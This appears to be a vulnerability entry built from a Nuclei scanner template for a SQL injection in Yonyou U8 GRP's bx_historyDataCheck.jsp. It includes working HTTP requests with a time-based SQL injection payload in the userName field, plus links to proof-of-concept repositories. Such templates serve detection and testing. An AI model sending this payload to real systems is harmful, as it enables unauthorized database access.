# Nuclei Template: Yonyou U8 bx_historyDataCheck - SQL Injection
**Template ID:** yonyou-u8-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`yonyou-u8-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Yonyou U8 Grp contains a SQL injection vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET /login.jsp HTTP/1.1
Host: {{Hostname}}

@timeout: 20s
POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userName='%3bWAITFOR+DELAY+'0%3a0%3a5'--%26ysnd%3d%26historyFlag%3d
```

## References
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/yonyou-grp-u8-bx_historyDataChecks-sqli.yaml
- https://github.com/MD-SEC/MDPOCS/blob/main/Yongyou_Grp_U8_bx_historyDataCheck_Sql_Poc.py
